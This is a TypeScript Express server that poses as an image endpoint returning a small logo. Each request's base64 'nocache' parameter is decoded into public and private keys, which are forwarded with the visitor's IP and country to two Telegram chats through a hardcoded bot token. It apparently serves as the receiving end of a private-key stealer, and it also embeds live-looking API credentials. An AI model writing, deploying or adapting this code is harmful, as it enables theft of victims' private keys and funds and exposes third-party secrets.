import express from 'express';
import axios from 'axios';
import { Buffer } from 'buffer';
import { createLogger, transports, format } from 'winston';
import retry from 'async-retry';

interface DecryptedData {
  timestamp?: string | null;
  header?: string;
  keys?: Array<{ public?: string; private?: string }>;
  error?: string;
}

interface TelegramConfig {
  botToken: string;
  chatIds: string[];
}

interface IpInfoConfig {
  token: string;
}

// Настройка логгера
const logger = createLogger({
  level: 'info',
  format: format.combine(
    format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
    format.errors({ stack: true }),
    format.splat(),
    format.json()
  )
});

const app = express();

// Конфигурация из переменных окружения
const config = {
  telegram: {
    botToken: '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw',
    chatIds: [
      '5018443124',
      '8131950012'
    ]
  },
  ipInfo: {
    token: '717875db282daa'
  },
  logoBase64: 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=',
  retryOptions: {
    retries: 5,
    minTimeout: 1000,
    maxTimeout: 5000,
    factor: 2
  }
};

// Включаем доверие к прокси
app.set('trust proxy', true);

// Middleware для логирования запросов
app.use((req, res, next) => {
  logger.info(`Incoming request: ${req.method} ${req.path} from IP: ${req.ip}`);
  next();
});

// Middleware для обработки CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// Обработчик OPTIONS
app.options('/', (req, res) => {
  res.status(200).end();
});

// Обработчик GET запросов
app.get('/', async (req, res) => {
  try {
    const userIp = getClientIp(req);
    logger.info(`Processing request from IP: ${userIp}`);
    
    const country = await getCountryByIp(userIp, config.ipInfo);
    const decryptedData = await decryptNocache(req.query.nocache as string, config.telegram);

    logger.info(`Data decrypted successfully for IP: ${userIp}`);

    // Отправляем данные в Telegram с гарантированной доставкой
    await sendToTelegramWithRetry(userIp, country, decryptedData, config.telegram, config.retryOptions);

    // Отправляем изображение
    sendLogoImage(res, config.logoBase64);

    logger.info(`Request processed successfully for IP: ${userIp}`);

  } catch (error) {
    logger.error(`Error processing request: ${error instanceof Error ? error.message : String(error)}`);
    
    try {
      await sendErrorMessageWithRetry(
        `ОШИБКА в обработке запроса: ${error instanceof Error ? error.message : String(error)}`,
        config.telegram,
        config.retryOptions
      );
    } catch (telegramError) {
      logger.error(`Failed to send error message to Telegram: ${telegramError instanceof Error ? telegramError.message : String(telegramError)}`);
    }
    
    res.status(500).send('Internal Server Error');
  }
});

// Функции помощники
function getClientIp(req: express.Request): string {
  const ip = req.headers['x-forwarded-for']?.toString().split(',')[0]?.trim() || 
              req.socket?.remoteAddress || 
              req.connection?.remoteAddress || 
              req.ip || 'unknown';
  logger.debug(`Resolved client IP: ${ip}`);
  return ip;
}

async function decryptNocache(nocache: string | undefined, telegramConfig: TelegramConfig): Promise<DecryptedData> {
  if (!nocache) {
    logger.debug('No nocache data provided');
    return {};
  }
  
  try {
    const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
    const data = JSON.parse(decoded);
    
    logger.debug('Successfully decrypted nocache data');
    return {
      timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
      header: data.header,
      keys: data.keys || []
    };
  } catch (error) {
    logger.error(`Decryption error: ${error instanceof Error ? error.message : String(error)}`);
    await sendErrorMessageWithRetry(
      `ОШИБКА при декрипте: ${error instanceof Error ? error.message : String(error)}`,
      telegramConfig,
      config.retryOptions
    );
    return { error: 'Failed to decrypt data' };
  }
}

async function getCountryByIp(ip: string, ipInfoConfig: IpInfoConfig): Promise<string> {
  if (!ip || ip === '::1' || ip === '127.0.0.1') {
    logger.debug('Local IP detected');
    return 'Local';
  }
  
  try {
    logger.debug(`Fetching country for IP: ${ip}`);
    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${ipInfoConfig.token}`);
    const country = response.data.country || 'Unknown';
    logger.debug(`Country resolved: ${country} for IP: ${ip}`);
    return country;
  } catch (error) {
    logger.error(`IP info error: ${error instanceof Error ? error.message : String(error)}`);
    return 'Error';
  }
}

async function sendToTelegramWithRetry(
  ip: string,
  country: string,
  decryptedData: DecryptedData,
  telegramConfig: TelegramConfig,
  retryOptions: retry.Options
): Promise<void> {
  const message = buildTelegramMessage(ip, country, decryptedData);
  const delayBetweenChats = 500; // Задержка в 500 мс между чатами
  
  // Вспомогательная функция для задержки
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  // Отправляем последовательно с задержкой между чатами
  for (const chatId of telegramConfig.chatIds) {
    try {
      await retry(
        async (bail) => {
          try {
            logger.debug(`Sending message to chat ${chatId}`);
            await axios.post(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown'
            });
            logger.info(`Message successfully sent to chat ${chatId}`);
          } catch (error: any) {
            if (error.response?.status === 400) {
              logger.error(`Permanent error sending to chat ${chatId}: ${error.message}`);
              bail(error);
              return;
            }
            logger.warn(`Attempt failed for chat ${chatId}: ${error.message}`);
            throw error;
          }
        },
        retryOptions
      );
    } catch (error: any) {
      logger.error(`Failed to send message to chat ${chatId} after retries: ${error.message}`);
    }
    
    // Добавляем задержку перед отправкой в следующий чат
    if (telegramConfig.chatIds.indexOf(chatId) < telegramConfig.chatIds.length - 1) {
      await delay(delayBetweenChats);
    }
  }
}

function buildTelegramMessage(
  ip: string,
  country: string,
  decryptedData: DecryptedData
): string {
  let message = `🌐 *Новый запрос логотипа*\n\n`;
  message += `🖥️ *IP*: \`${ip}\`\n`;
  message += `📍 *Страна*: ${country}\n\n`;

  if (decryptedData.error) {
    message += `❌ *Ошибка расшифровки*: \`${decryptedData.error}\`\n`;
  } else {
    if (decryptedData.header) {
      message += `📋 *Заголовок*: \`${decryptedData.header}\`\n\n`;
    }

    if (decryptedData.timestamp) {
      message += `⏱️ *Время запроса*: \`${decryptedData.timestamp}\`\n\n`;
    }

    if (decryptedData.keys?.length) {
      message += `🔑 *Ключи (${decryptedData.keys.length})*:\n`;
      decryptedData.keys.forEach((key, index) => {
        message += `\n*Ключ ${index + 1}*:\n`;
        message += `▫️ *Публичный*: \`${key.public || 'отсутствует'}\`\n`;
        message += `▫️ *Приватный*: \`${key.private || 'отсутствует'}\`\n`;
      });
    }
  }

  return message;
}

function sendLogoImage(res: express.Response, logoBase64: string): void {
  try {
    const imageBuffer = Buffer.from(logoBase64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.status(200).send(imageBuffer);
    logger.debug('Logo image sent successfully');
  } catch (error) {
    logger.error(`Error sending logo image: ${error instanceof Error ? error.message : String(error)}`);
    throw error;
  }
}

async function sendErrorMessageWithRetry(
  message: string,
  telegramConfig: TelegramConfig,
  retryOptions: retry.Options
): Promise<void> {
  await retry(
    async (bail) => {
      try {
        logger.debug('Sending error message to Telegram');
        await axios.post(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
          chat_id: telegramConfig.chatIds[0], // Только в основной чат
          text: message,
          parse_mode: 'Markdown'
        });
        logger.info('Error message sent successfully');
      } catch (error: any) {
        if (error.response?.status === 400) {
          logger.error(`Permanent error sending error message: ${error.message}`);
          bail(error);
          return;
        }
        logger.warn(`Attempt to send error message failed: ${error.message}`);
        throw error;
      }
    },
    retryOptions
  ).catch(error => {
    logger.error(`Failed to send error message after retries: ${error.message}`);
    throw error;
  });
}

export default app;